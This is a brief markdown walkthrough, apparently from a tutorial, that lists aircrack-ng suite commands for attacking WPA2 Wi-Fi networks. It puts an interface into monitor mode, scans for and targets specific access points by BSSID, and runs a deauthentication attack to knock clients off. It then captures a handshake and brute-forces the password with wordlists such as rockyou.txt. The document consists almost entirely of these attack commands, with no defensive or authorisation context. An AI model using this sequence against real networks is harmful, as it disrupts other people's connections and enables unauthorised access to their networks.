## Demonstration

### View Network Interfaces
```bash
ifconfig
```

### Start Monitor Mode on `wlan0`
```bash
airmon-ng start wlan0
```

### Kill Interfering Processes
```bash
airmon-ng check kill
```

### Confirm Monitor Mode
```bash
iwconfig
```

### Start Scanning for Wi-Fi Networks
```bash
airodump-ng -i wlan0mon
```

### Target Specific BSSID and Channel
```bash
airodump-ng --bssid 8E:F5:A3:77:D6:DB -c 3 -- wlan0
airodump-ng --bssid A8:32:9A:00:CE:96 -c 11 -w /root/Desktop/wpa2 -- wlan0mon
```

### Deauthentication Attack (Kick Clients Out)
```bash
aireplay-ng -0 20 -a A8:32:9A:00:CE:96 -c 08:4A:CF:7D:47:14 wlan0mon
```

### Brute Force Attack
```bash
aircrack-ng -a2 -b 78:1D:BA:93:1F:9A -w /root/Desktop/rockyou.txt
aircrack-ng -a2 -b A8:32:9A:00:66:E8 -w /media/root/CAF04BE4F04BD57B/test/word.txt /media/root/CAF04BE4F04BD57B/test/Digicom-01.cap
```

### Stop Monitor Mode
```bash
airmon-ng stop wlan0mon
service network-manager restart
```
